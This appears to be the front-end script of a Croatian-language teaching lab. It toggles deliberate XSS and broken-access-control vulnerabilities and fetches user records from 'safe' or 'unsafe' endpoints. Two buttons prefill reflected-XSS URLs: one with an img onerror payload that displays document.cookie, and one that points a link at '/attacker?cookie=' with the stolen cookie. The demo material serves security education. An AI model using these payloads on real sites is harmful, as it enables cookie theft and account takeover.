let vul_1 = false;
let vul_2 = false;

window.onload=async()=>{
    if(document.getElementById("xss_enable")){
        if(document.getElementById("xss_enable").checked){
            document.getElementById("label_xss_enable").innerText="Ranjivost uključena";
            vul_1 = true;
        }
        else{
            document.getElementById("label_xss_enable").innerText="Ranjivost isključena";
            vul_1 = false;
        }
    }

    if(document.getElementById("bac_enable")){
        if(document.getElementById("bac_enable").checked){
            document.getElementById("label_bac_enable").innerText="Ranjivost uključena";
            vul_2 = true;
        }
        else{
            document.getElementById("label_bac_enable").innerText="Ranjivost isključena";
            vul_2 = false;
        }
    }

    if(document.getElementById("prepared_url")){
        let full_url = baseURL;
        if(vul_2 === false){
            full_url += "/users/safe/1";
        }
        else full_url += "/users/unsafe/1";

        document.getElementById("prepared_url").textContent = full_url;

        try{
            const response = await fetch(full_url, {
                method: "GET",
                headers: {
                    "Content-Type": "application/json"
                }
            });

            const result = await response.json();
            document.getElementById("fetched_items").textContent = JSON.stringify(result, null, 2);
        }
        catch(error){
            document.getElementById("fetched_items").textContent = JSON.stringify(error, null, 2);
            return;
        }
    }
}

document.getElementById("xss_enable").addEventListener("change", async (e)=>{
    async function callSet(){
        try{
            const response = await fetch("/set", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    vul_1, vul_2
                })
            })

            if(!response.ok){
                vul_1 = !vul_1;
                e.target.checked = !e.target.checked;
                throw new Error("Neuspješan odgovor od poslužitelja.");
            }
        }
        catch(error){
            console.error(error);
            return alert("Neuspješno postavljanje postavki ranjivosti!");
        }
    }

    if(e.target.checked){
        vul_1 = true;
        await callSet();
        document.getElementById("label_xss_enable").innerText="Ranjivost uključena";
    }
    else{
        vul_1 = false;
        await callSet();
        document.getElementById("label_xss_enable").innerText="Ranjivost isključena";
    }
});

document.getElementById("bac_enable").addEventListener("change", async (e)=>{
    async function callSet(){
        try{
            const response = await fetch("/set", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    vul_1, vul_2
                })
            })

            if(!response.ok){
                vul_2 = !vul_2;
                e.target.checked = !e.target.checked;
                throw new Error("Neuspješan odgovor od poslužitelja.");
            }
        }
        catch(error){
            console.error(error);
            return alert("Neuspješno postavljanje postavki ranjivosti!");
        }
    }

    if(e.target.checked){
        vul_2 = true;
        await callSet();
        document.getElementById("label_bac_enable").innerText="Ranjivost uključena";
    }
    else{
        vul_2 = false;
        await callSet();
        document.getElementById("label_bac_enable").innerText="Ranjivost isključena";
    }

    let full_url = baseURL;
    if(vul_2 === false){
        full_url += "/users/safe/";
    }
    else full_url += "/users/unsafe/";

    document.getElementById("prepared_url").textContent = full_url+document.getElementById("bac_id_input").valueAsNumber;

    try{
        const response = await fetch(document.getElementById("prepared_url").textContent, {
            method: "GET",
            headers: {
                "Content-Type": "application/json"
            }
        });

        const result = await response.json();
        document.getElementById("fetched_items").textContent = JSON.stringify(result, null, 2);
    }
    catch(error){
        document.getElementById("fetched_items").textContent = JSON.stringify(error, null, 2);
        return;
    }
});

document.getElementById("xss1_button").addEventListener("click", ()=>{
    document.getElementById("xss1_input").value = `${baseURL}/welcome?name=<img src="" onerror="document.getElementById('welcome_title').innerHTML=document.cookie">`;
    document.getElementById("xss1_test").disabled = false;
})

document.getElementById("xss1_input").addEventListener("input", ()=>{
    document.getElementById("xss1_test").disabled = document.getElementById("xss1_input").value.trim() === "";
})

document.getElementById("xss1_test").addEventListener("click", ()=>{
    window.open(document.getElementById("xss1_input").value.trim(),"_blank");
})

document.getElementById("xss2_button").addEventListener("click", ()=>{
    document.getElementById("xss2_input").value = `${baseURL}/welcome?name=%3Cimg%20src%3Dx%20onerror%3D%27document.getElementById(%22link%22).href=%22/attacker?cookie=%22%2BencodeURIComponent(document.cookie)%27%3E`;
    document.getElementById("xss2_test").disabled = false;
})

document.getElementById("xss2_input").addEventListener("input", ()=>{
    document.getElementById("xss2_test").disabled = document.getElementById("xss2_input").value.trim() === "";
})

document.getElementById("xss2_test").addEventListener("click", ()=>{
    window.open(document.getElementById("xss2_input").value.trim(),"_blank");
})

document.getElementById("bac_id_input").addEventListener("input", async (e)=>{
    let full_url = baseURL;
    if(vul_2 === false){
        full_url += "/users/safe/";
    }
    else full_url += "/users/unsafe/";

    document.getElementById("prepared_url").textContent = full_url+e.target.valueAsNumber;

    try{
        const response = await fetch(document.getElementById("prepared_url").textContent, {
            method: "GET",
            headers: {
                "Content-Type": "application/json"
            }
        });

        const result = await response.json();
        document.getElementById("fetched_items").textContent = JSON.stringify(result, null, 2);
    }
    catch(error){
        document.getElementById("fetched_items").textContent = JSON.stringify(error, null, 2);
        return;
    }
})

document.getElementById("bac_id_input").addEventListener("mouseenter",()=>{
    document.getElementById("bac_id_input").focus();
})

document.getElementById("bac_id_input").addEventListener("mouseleave",()=>{
    document.getElementById("bac_id_input").blur();
})